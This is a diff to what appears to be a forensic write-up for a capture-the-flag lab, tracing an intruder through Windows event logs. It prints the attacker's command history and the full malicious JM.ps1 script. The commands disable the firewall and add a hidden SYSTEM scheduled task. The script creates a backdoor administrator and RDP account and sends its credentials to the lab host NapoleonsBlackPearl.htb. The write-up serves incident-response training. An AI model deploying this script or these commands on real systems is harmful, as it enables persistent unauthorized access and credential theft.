@@ -104,40 +104,24 @@ Let's break it down:
 
 As we can see, there are a lot of commands executed, and we can trace them! Let's create a history of them (I've removed the useless lines):
 
-```Bash
+```PowerShell
 rg -N "ADMIN\\$" 4688.csv | cut -d '|' -f8     
-
 cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1
-
 cmd.exe /Q /c systeminfo 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1
-
 cmd.exe /Q /c cd /Users/Werni 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1
-
 cmd.exe /Q /c cd MonitorHPC 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1
-
 cmd.exe /Q /c type monitor.ps1 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1
-
 cmd.exe /Q /c type known_hosts 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1
-
 "cmd.exe /Q /c cmd /C ""echo 10.129.242.110 NapoleonsBlackPearl.htb >> C:\Windows\System32\drivers\etc\hosts"" 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1"
-
 cmd.exe /Q /c type C:\Windows\System32\drivers\etc\hosts 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1
 cmd.exe /Q /c cd Appdata\local 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1
-
 "cmd.exe /Q /c schtasks /create /tn ""SysHelper Update"" /tr ""powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Werni\Appdata\Local\JM.ps1"" /sc minute /mo 2 /ru SYSTEM /f 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1"
-
 cmd.exe /Q /c netsh advfirewall set allprofiles state off 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1
-
 "cmd.exe /Q /c reg add ""HKLM\SYSTEM\CurrentControlSet\Services\WinHttpAutoProxySvc"" /v Start /t REG_DWORD /d 3 /f 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1"
-
 cmd.exe /Q /c .\proxy.bat 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1
-
 cmd.exe /Q /c rm .\proxy.bat 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1
-
 cmd.exe /Q /c del .\proxy.bat 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1
-
 cmd.exe /Q /c shutdown /r /t 0 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1
-2>&1
 ```
 
 So we have our answer:
@@ -166,7 +150,7 @@ First, in the attacker's cmd history we've just created, there is an entry from 
 So we know that the attacker is using the WERNI account to execute remote commands, so let's check the 4624 event to see what IP he is using:
 
 ```bash
-rg -i "2025-08-24\|((23:00:..)|(22:5.:..))"
+rg -i "2025-08-24\|((23:00:..)|(22:5.:..))" 4624.csv
 2025-08-24|22:56:58|4624|-|Werni|10.129.242.110|36756|3
 2025-08-24|22:58:58|4624|-|Werni|10.129.242.110|35072|3
 2025-08-24|22:59:28|4624|HEISEN-9-WS-6$|SYSTEM|-|-|5
@@ -213,27 +197,22 @@ Ok, let's go reverse the script `jm.ps1`:
 
 ```PowerShell
 cat JM.ps1 
-# List of potential usernames
 $usernames = @("svc_netupd", "svc_dns", "sys_helper", "WinTelemetry", "UpdaterSvc")
-
-# Check for existing user
 $existing = $usernames | Where-Object {
     Get-LocalUser -Name $_ -ErrorAction SilentlyContinue
 }
 
-# If none exist, create a new one
+
 if (-not $existing) {
     $newUser = Get-Random -InputObject $usernames
     $timestamp = (Get-Date).ToString("yyyyMMddHHmmss")
     $password = "Watson_$timestamp"
-
     $securePass = ConvertTo-SecureString $password -AsPlainText -Force
 
     New-LocalUser -Name $newUser -Password $securePass -FullName "Windows Update Helper" -Description "System-managed service account"
     Add-LocalGroupMember -Group "Administrators" -Member $newUser
     Add-LocalGroupMember -Group "Remote Desktop Users" -Member $newUser
 
-    # Enable RDP
     Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
     Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
     Invoke-WebRequest -Uri "[http://NapoleonsBlackPearl.htb/Exchange?data=$](http://NapoleonsBlackPearl.htb/Exchange?data=$)([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$newUser|$password")))" -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
@@ -245,11 +224,7 @@ The attacker was nice enough to leave us comments!
 So basically, this script does:
 1. Check if a username from a list exists:
 ```PowerShell
- 
-# List of potential usernames
 $usernames = @("svc_netupd", "svc_dns", "sys_helper", "WinTelemetry", "UpdaterSvc")
-
-# Check for existing user
 $existing = $usernames | Where-Object {
     Get-LocalUser -Name $_ -ErrorAction SilentlyContinue
 }
@@ -258,12 +233,11 @@ $existing = $usernames | Where-Object {
 2. If not, it creates it and adds it to the Admin and RDP groups:
 
 ```PowerShell  
-# If none exist, create a new one
+
 if (-not $existing) {
     $newUser = Get-Random -InputObject $usernames
     $timestamp = (Get-Date).ToString("yyyyMMddHHmmss")
     $password = "Watson_$timestamp"
-
     $securePass = ConvertTo-SecureString $password -AsPlainText -Force
 
     New-LocalUser -Name $newUser -Password $securePass -FullName "Windows Update Helper" -Description "System-managed service account"
@@ -273,7 +247,6 @@ if (-not $existing) {
 
 3. Then, it allows RDP login:
 ```PowerShell
-# Enable RDP
     Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
     Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 ```
@@ -286,6 +259,7 @@ if (-not $existing) {
 So what user did the attacker create?
 
 Let's check out the possible usernames:
+
 ```PowerShell
 $usernames = @("svc_netupd", "svc_dns", "sys_helper", "WinTelemetry", "UpdaterSvc")
 ```
@@ -309,14 +283,14 @@ The script will try to create the User: `svc_netupd` at first, so we will grep f
 rg -i "svc_netupd"
 user_modification.csv
 Date|Time|event_code|info|TargetUserName|SubjectUserName|TargetDomainName|TargetSid|SamAccountName|PasswordLastSet
-37:2025-08-24|23:05:09|4720|User Account Created|svc_netupd|HEISEN-9-WS-6$|HEISEN-9-WS-6|S-1-5-21-3871582759-1638593395-315824688-1003|svc_netupd|%%1794
-38:2025-08-24|23:05:09|4722|User Account Enabled|svc_netupd|HEISEN-9-WS-6$|HEISEN-9-WS-6|S-1-5-21-3871582759-1638593395-315824688-1003||
-39:2025-08-24|23:05:09|4738|User Account Changed|svc_netupd|HEISEN-9-WS-6$|HEISEN-9-WS-6|S-1-5-21-3871582759-1638593395-315824688-1003|svc_netupd|%%1794
-40:2025-08-24|23:05:09|4738|User Account Changed|svc_netupd|HEISEN-9-WS-6$|HEISEN-9-WS-6|S-1-5-21-3871582759-1638593395-315824688-1003|-|-
-41:2025-08-24|23:05:09|4724|Password Reset Attempt|svc_netupd|HEISEN-9-WS-6$|HEISEN-9-WS-6|S-1-5-21-3871582759-1638593395-315824688-1003||
+2025-08-24|23:05:09|4720|User Account Created|svc_netupd|HEISEN-9-WS-6$|HEISEN-9-WS-6|S-1-5-21-3871582759-1638593395-315824688-1003|svc_netupd|%%1794
+2025-08-24|23:05:09|4722|User Account Enabled|svc_netupd|HEISEN-9-WS-6$|HEISEN-9-WS-6|S-1-5-21-3871582759-1638593395-315824688-1003||
+2025-08-24|23:05:09|4738|User Account Changed|svc_netupd|HEISEN-9-WS-6$|HEISEN-9-WS-6|S-1-5-21-3871582759-1638593395-315824688-1003|svc_netupd|%%1794
+2025-08-24|23:05:09|4738|User Account Changed|svc_netupd|HEISEN-9-WS-6$|HEISEN-9-WS-6|S-1-5-21-3871582759-1638593395-315824688-1003|-|-
+2025-08-24|23:05:09|4724|Password Reset Attempt|svc_netupd|HEISEN-9-WS-6$|HEISEN-9-WS-6|S-1-5-21-3871582759-1638593395-315824688-1003||
 
 SAM_yarp.jsonl
-24:{"path": "ROOT\\SAM\\Domains\\Account\\Users\\Names\\svc_netupd", "name": "svc_netupd", "last_written_timestamp": "2025-08-24T23:05:09.757920", "values": {"": {"type": "0x3eb", "size": 0, "data": ""}}}
+{"path": "ROOT\\SAM\\Domains\\Account\\Users\\Names\\svc_netupd", "name": "svc_netupd", "last_written_timestamp": "2025-08-24T23:05:09.757920", "values": {"": {"type": "0x3eb", "size": 0, "data": ""}}}
 ```
 
 We do have some matches and the timestamp does match the execution of the Script jm.ps1:
